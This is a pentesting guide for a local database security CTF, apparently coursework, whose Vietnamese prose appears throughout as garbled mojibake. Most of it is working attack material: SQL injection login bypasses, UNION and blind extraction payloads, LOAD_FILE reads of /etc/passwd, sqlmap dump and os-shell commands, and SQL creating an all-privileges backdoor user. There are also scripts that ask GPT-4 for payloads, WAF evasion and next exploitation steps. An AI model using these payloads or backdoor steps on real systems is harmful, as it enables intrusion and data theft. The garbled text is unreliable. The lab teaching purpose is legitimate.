# Database Security CTF - Pentesting Guide

HÆ°á»›ng dáº«n chi tiáº¿t cho viá»‡c Penetration Testing mÃ´i trÆ°á»ng Database Security CTF nÃ y.

## ğŸ¯ Má»¥c TiÃªu

Guide nÃ y dÃ nh cho pháº§n **Pentesting** cá»§a project, giÃºp báº¡n:
1. Thá»±c hiá»‡n pentesting theo Ä‘Ãºng chuáº©n quy trÃ¬nh
2. TÃ­ch há»£p AI tools vÃ o workflow
3. Document findings má»™t cÃ¡ch professional
4. Táº¡o report cho giáº£ng viÃªn

## ğŸ“‹ Quy TrÃ¬nh Pentesting Chuáº©n

### 1. RECONNAISSANCE (Thu tháº­p thÃ´ng tin)

#### 1.1 Network Scanning

```bash
# Port scanning
nmap -sV -p- localhost

# Aggressive scan
nmap -A -p 3306,5000,8080 localhost

# Save results
nmap -sV -p- localhost -oN nmap_scan.txt
```

#### 1.2 Service Detection

```bash
# Banner grabbing vá»›i netcat
nc localhost 3306

# HTTP headers
curl -I http://localhost:8080

# MySQL version
mysql -h localhost -P 3306 -u ctf_user -p -e "SELECT VERSION();"
```

#### 1.3 Web Enumeration

```bash
# Check robots.txt
curl http://localhost:8080/robots.txt

# Directory enumeration (náº¿u cáº§n)
dirb http://localhost:8080

# Technology detection
whatweb http://localhost:8080
```

#### 1.4 Sá»­ Dá»¥ng AI cho Reconnaissance

**Prompt cho ChatGPT/Claude:**
```
Analyze this nmap output and identify potential vulnerabilities:
[paste nmap output]

What are common vulnerabilities for MySQL 8.0 service?
```

---

### 2. ENUMERATION (Liá»‡t kÃª)

#### 2.1 Database Enumeration

```sql
-- Connect to database
mysql -h localhost -P 3306 -u ctf_user -p

-- List all databases
SHOW DATABASES;

-- Select database
USE ctf_database;

-- List tables
SHOW TABLES;

-- Describe table structure
DESCRIBE users;
DESCRIBE admin_panel;

-- Check privileges
SHOW GRANTS;
SHOW GRANTS FOR CURRENT_USER;

-- List users
SELECT user, host FROM mysql.user;

-- Check variables
SHOW VARIABLES LIKE '%version%';
SHOW VARIABLES LIKE '%secure%';
```

#### 2.2 Web Application Enumeration

```bash
# Using sqlmap for initial enumeration
sqlmap -u "http://localhost:8080/index.php?page=login" \
       --data="username=test&password=test" \
       --dbs \
       --batch

# Enumerate tables
sqlmap -u "http://localhost:8080/index.php?page=login" \
       --data="username=test&password=test" \
       -D ctf_database \
       --tables \
       --batch

# Enumerate columns
sqlmap -u "http://localhost:8080/index.php?page=login" \
       --data="username=test&password=test" \
       -D ctf_database \
       -T admin_panel \
       --columns \
       --batch
```

#### 2.3 AI-Assisted Enumeration

**Python Script vá»›i AI:**
```python
import openai

def analyze_database_structure(tables_list):
    prompt = f"""
    Given these database tables: {tables_list}

    1. Identify potentially sensitive tables
    2. Suggest SQL queries to extract valuable data
    3. Recommend attack vectors
    """

    response = openai.ChatCompletion.create(
        model="gpt-4",
        messages=[{"role": "user", "content": prompt}]
    )

    return response.choices[0].message.content

# Usage
tables = ["users", "admin_panel", "products", "audit_log"]
recommendations = analyze_database_structure(tables)
print(recommendations)
```

---

### 3. VULNERABILITY ASSESSMENT (ÄÃ¡nh giÃ¡ lá»— há»•ng)

#### 3.1 SQL Injection Testing

**Manual Testing:**

```
# Authentication Bypass - Login Form
Username: admin' OR '1'='1' --
Password: anything

Username: admin'--
Password:

Username: ' OR 1=1--
Password:

# Comment-based injection
Username: admin'/*
Password: */OR'1'='1

# UNION-based injection
Username: ' UNION SELECT NULL, NULL, NULL--
Password:
```

**Automated Testing:**
```bash
# sqlmap full scan
sqlmap -u "http://localhost:8080/index.php?page=login" \
       --data="username=admin&password=test" \
       --risk=3 \
       --level=5 \
       --batch \
       --dump

# Test specific parameter
sqlmap -u "http://localhost:8080/index.php?page=product_detail&id=1" \
       --dbs \
       --batch
```

#### 3.2 Blind SQL Injection

```bash
# Time-based blind SQLi
sqlmap -u "http://localhost:8080/index.php?page=product_detail&id=1" \
       --technique=T \
       --batch

# Boolean-based blind SQLi
' AND 1=1--  # True condition
' AND 1=2--  # False condition

# Extract data character by character
' AND SUBSTRING((SELECT password FROM admin_panel LIMIT 1),1,1)='a'--
```

#### 3.3 AI-Generated Payloads

**Prompt:**
```
Generate 10 advanced SQL injection payloads for MySQL 8.0 that can:
1. Bypass authentication
2. Extract data using UNION
3. Work with WAF evasion
4. Use time-based blind SQLi
```

**Python Script:**
```python
import openai

def generate_sqli_payloads(context, objective):
    prompt = f"""
    Context: {context}
    Objective: {objective}
    Database: MySQL 8.0

    Generate 5 SQL injection payloads optimized for this scenario.
    Include explanation for each payload.
    """

    response = openai.ChatCompletion.create(
        model="gpt-4",
        messages=[{"role": "user", "content": prompt}]
    )

    return response.choices[0].message.content

# Usage
context = "Login form with username and password fields"
objective = "Bypass authentication and access admin panel"
payloads = generate_sqli_payloads(context, objective)
print(payloads)
```

---

### 4. EXPLOITATION (Khai thÃ¡c)

#### 4.1 Authentication Bypass

**Challenge 5 Solution:**
```sql
-- In login form
Username: admin' OR '1'='1' --
Password: [anything]

-- Or in admin panel
Username: ' OR '1'='1' LIMIT 1--
Password:

-- Then extract flag
SELECT * FROM admin_panel;
```

#### 4.2 Data Extraction

**UNION-based SQLi:**
```sql
-- Find number of columns
' ORDER BY 1--
' ORDER BY 2--
...
' ORDER BY 6--  # If error, previous number is column count

-- UNION SELECT
' UNION SELECT 1,2,3,4,5,6--

-- Extract data
' UNION SELECT 1,username,password,secret_key,5,6 FROM admin_panel--

-- Extract from hidden column (Challenge 6)
' UNION SELECT 1,2,hidden_flag,4,5,6 FROM products--
```

#### 4.3 Local File Read (Challenge 7)

```sql
-- Read file
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5,6--

-- Read flag file
' UNION SELECT 1,LOAD_FILE('/var/lib/mysql/secret_flag.txt'),3,4,5,6--

-- Check file_references table
SELECT * FROM file_references;
```

#### 4.4 Using sqlmap for Exploitation

```bash
# Dump entire database
sqlmap -u "http://localhost:8080/index.php?page=login" \
       --data="username=admin&password=test" \
       -D ctf_database \
       --dump-all \
       --batch

# Read file
sqlmap -u "http://localhost:8080/index.php?page=product_detail&id=1" \
       --file-read="/var/lib/mysql/secret_flag.txt" \
       --batch

# OS shell (if possible)
sqlmap -u "http://localhost:8080/index.php?page=product_detail&id=1" \
       --os-shell \
       --batch
```

#### 4.5 AI-Optimized Exploitation

**Script: auto_exploit.py**
```python
import requests
import openai
import time

def ai_analyze_response(response_text):
    """Use AI to analyze response and suggest next step"""
    prompt = f"""
    Analyze this SQL injection response:
    {response_text}

    1. Is the injection successful?
    2. What data is revealed?
    3. What should be the next payload?
    """

    response = openai.ChatCompletion.create(
        model="gpt-4",
        messages=[{"role": "user", "content": prompt}]
    )

    return response.choices[0].message.content

def test_payload(url, payload):
    """Test a SQL injection payload"""
    data = {
        'username': payload,
        'password': 'test'
    }

    response = requests.post(url, data=data)
    return response.text

# Main exploitation loop
url = "http://localhost:8080/index.php?page=login"
initial_payload = "admin' OR '1'='1' --"

response = test_payload(url, initial_payload)
analysis = ai_analyze_response(response)
print(analysis)
```

---

### 5. POST-EXPLOITATION

#### 5.1 Privilege Escalation (Challenge 8)

```sql
-- List stored procedures
SHOW PROCEDURE STATUS WHERE Db = 'ctf_database';

-- Show procedure code
SHOW CREATE PROCEDURE get_admin_secret;

-- Call procedure
CALL get_admin_secret();

-- Check current privileges
SHOW GRANTS FOR CURRENT_USER;

-- Try to escalate (if possible)
SELECT * FROM mysql.user;
```

#### 5.2 Backdoor Detection (Challenge 9)

```sql
-- List triggers
SHOW TRIGGERS FROM ctf_database;

-- Show trigger code
SHOW CREATE TRIGGER backdoor_trigger;

-- Check audit log for backdoor activity
SELECT * FROM audit_log WHERE action LIKE '%backdoor%';

-- Trigger the backdoor
INSERT INTO user_logs (user_id, action, ip_address)
VALUES (1, 'test', '127.0.0.1');

-- Check result
SELECT * FROM audit_log ORDER BY timestamp DESC LIMIT 5;
```

#### 5.3 Log Analysis (Challenge 10)

```sql
-- Check audit logs
SELECT * FROM audit_log;

-- Search for specific entries
SELECT * FROM audit_log WHERE action LIKE '%log%';

-- Check MySQL general log (if accessible)
-- File: /var/lib/mysql/general.log

-- Extract flag
SELECT * FROM audit_log WHERE action = 'log_analysis_key';
```

#### 5.4 Persistence & Data Exfiltration

```sql
-- Create backdoor user (if privileges allow)
CREATE USER 'backdoor'@'%' IDENTIFIED BY 'secret_password';
GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%';

-- Export data
SELECT * FROM users INTO OUTFILE '/tmp/users_dump.txt';

-- Create malicious stored procedure
DELIMITER //
CREATE PROCEDURE backdoor_shell()
BEGIN
    -- Backdoor logic
END //
DELIMITER ;
```

---

### 6. AI INTEGRATION STRATEGIES

#### 6.1 AI for Payload Generation

**ChatGPT Prompt Template:**
```
I'm testing a MySQL database for SQL injection vulnerabilities in a legal CTF environment.

Target: Login form with username and password fields
Context: [describe what you've found so far]
Goal: [describe what you want to achieve]

Generate optimized SQL injection payloads that:
1. [specific requirement 1]
2. [specific requirement 2]
3. Explain why each payload works
```

#### 6.2 AI for Error Analysis

**Script: ai_error_analyzer.py**
```python
import openai

def analyze_sql_error(error_message):
    prompt = f"""
    I received this SQL error during penetration testing:

    {error_message}

    1. What does this error reveal about the database structure?
    2. What information can I extract from this error?
    3. What should be my next payload to exploit this?
    4. Are there any security implications?
    """

    response = openai.ChatCompletion.create(
        model="gpt-4",
        messages=[{"role": "user", "content": prompt}]
    )

    return response.choices[0].message.content

# Usage
error = "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') AND password = MD5('')' at line 1"

analysis = analyze_sql_error(error)
print(analysis)
```

#### 6.3 AI for Blind SQLi Optimization

```python
import openai
import time

def optimize_blind_sqli(previous_attempts):
    prompt = f"""
    I'm performing blind SQL injection. Here are my previous attempts:
    {previous_attempts}

    Optimize my approach:
    1. Suggest faster extraction methods
    2. Recommend binary search techniques
    3. Provide optimized payloads
    """

    response = openai.ChatCompletion.create(
        model="gpt-4",
        messages=[{"role": "user", "content": prompt}]
    )

    return response.choices[0].message.content
```

#### 6.4 AI-Powered Report Generation

```python
def generate_vulnerability_report(findings):
    prompt = f"""
    Generate a professional penetration testing report for these findings:

    {findings}

    Include:
    1. Executive Summary
    2. Vulnerability Details
    3. Risk Assessment
    4. Remediation Recommendations
    5. Technical Details
    """

    response = openai.ChatCompletion.create(
        model="gpt-4",
        messages=[{"role": "user", "content": prompt}]
    )

    return response.choices[0].message.content
```

---

### 7. DOCUMENTATION & REPORTING

#### 7.1 Document Each Step

Táº¡o file `pentest_log.md` vá»›i format:

```markdown
# Penetration Testing Log

## Date: 2024-XX-XX
## Tester: [Your Name]
## Target: Database Security CTF

### Challenge 1: Database Fingerprinting
**Time:** 10:00 - 10:15
**Tools Used:** nmap, netcat
**Commands:**
```bash
nmap -sV -p 3306 localhost
```

**Findings:**
- MySQL 8.0.35 detected
- Port 3306 open
- Flag found in: system_info table

**Flag:** FLAG{...}

---
```

#### 7.2 Screenshot Everything

Sá»­ dá»¥ng tools:
- Burp Suite (automatic logging)
- Flameshot (screenshots)
- OBS (screen recording)

#### 7.3 Final Report Structure

```markdown
# Database Security Penetration Testing Report

## Executive Summary
[Overview of findings]

## Scope
- Target: localhost
- Services: MySQL, Web Application
- Time: [duration]

## Methodology
1. Reconnaissance
2. Enumeration
3. Vulnerability Assessment
4. Exploitation
5. Post-Exploitation

## Findings

### Critical Vulnerabilities
1. SQL Injection in Login Form
   - **Severity:** Critical
   - **CVSS Score:** 9.8
   - **Description:** ...
   - **Proof of Concept:** ...
   - **Remediation:** ...

### High Vulnerabilities
...

## AI Tools Integration
- ChatGPT for payload generation
- Claude for error analysis
- Custom Python scripts with OpenAI API

## Recommendations
1. Input validation
2. Prepared statements
3. Principle of least privilege
...

## Conclusion
[Summary]
```

---

### 8. TOOLS & RESOURCES

#### Essential Tools:
```bash
# Install tools (on Kali Linux)
sudo apt update
sudo apt install nmap sqlmap burpsuite mysql-client python3-pip

# Install Python libraries
pip3 install requests openai python-dotenv
```

#### Useful Commands Cheatsheet:

```bash
# Nmap
nmap -sV -p- localhost
nmap -A --script=mysql-* -p 3306 localhost

# MySQL Client
mysql -h localhost -P 3306 -u ctf_user -p
mysql -h localhost -P 3306 -u root -p -e "SHOW DATABASES;"

# sqlmap
sqlmap -u "URL" --data="POST_DATA" --dbs --batch
sqlmap -u "URL" --data="POST_DATA" -D DATABASE --tables --batch
sqlmap -u "URL" --data="POST_DATA" -D DATABASE -T TABLE --dump --batch

# Burp Suite
# Configure browser proxy: 127.0.0.1:8080
# Intercept and modify requests

# curl
curl -X POST http://localhost:8080/index.php?page=login \
     -d "username=admin' OR '1'='1' --&password=test"
```

---

### 9. COMMON PITFALLS & TIPS

#### âŒ Common Mistakes:
1. KhÃ´ng document findings
2. Skip reconnaissance phase
3. KhÃ´ng test manually trÆ°á»›c khi dÃ¹ng automated tools
4. QuÃªn URL encode special characters
5. KhÃ´ng hiá»ƒu output cá»§a tools

#### âœ… Best Practices:
1. Follow methodology tá»«ng bÆ°á»›c
2. Document má»i thá»©
3. Verify findings manually
4. Use AI Ä‘á»ƒ explain, khÃ´ng pháº£i thay tháº¿ thinking
5. Test trÃªn nhiá»u browsers
6. Save all outputs vÃ  logs

---

### 10. SAMPLE WORKFLOW

**Complete Challenge 5 Example:**

```bash
# Step 1: Reconnaissance
curl -I http://localhost:8080/index.php?page=admin

# Step 2: Manual Testing
# Try: admin' OR '1'='1' --

# Step 3: AI Analysis
# Ask ChatGPT: "Explain why this payload works: admin' OR '1'='1' --"

# Step 4: Verify with sqlmap
sqlmap -u "http://localhost:8080/index.php?page=admin" \
       --data="username=admin&password=test" \
       --technique=E \
       --batch

# Step 5: Extract flag
mysql -h localhost -P 3306 -u ctf_user -p
> SELECT * FROM admin_panel;

# Step 6: Submit flag to CTF platform
# http://localhost:5000

# Step 7: Document in report
```

---

## ğŸ“ Grading Criteria (Äá» xuáº¥t cho giáº£ng viÃªn)

1. **Methodology** (20%): Follow Ä‘Ãºng quy trÃ¬nh pentesting
2. **AI Integration** (25%): Sá»­ dá»¥ng AI tools effectively
3. **Documentation** (20%): Report chuyÃªn nghiá»‡p, Ä‘áº§y Ä‘á»§
4. **Technical Skills** (20%): Exploit thÃ nh cÃ´ng challenges
5. **Presentation** (15%): Demo vÃ  giáº£i thÃ­ch tá»‘t

---

## ğŸ“š Additional Resources

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PTES Technical Guidelines](http://www.pentest-standard.org/index.php/Main_Page)
- [HackTricks SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

---

**Good luck with your pentesting! Remember to document everything and use AI as an assistant, not a replacement for understanding. ğŸš€**
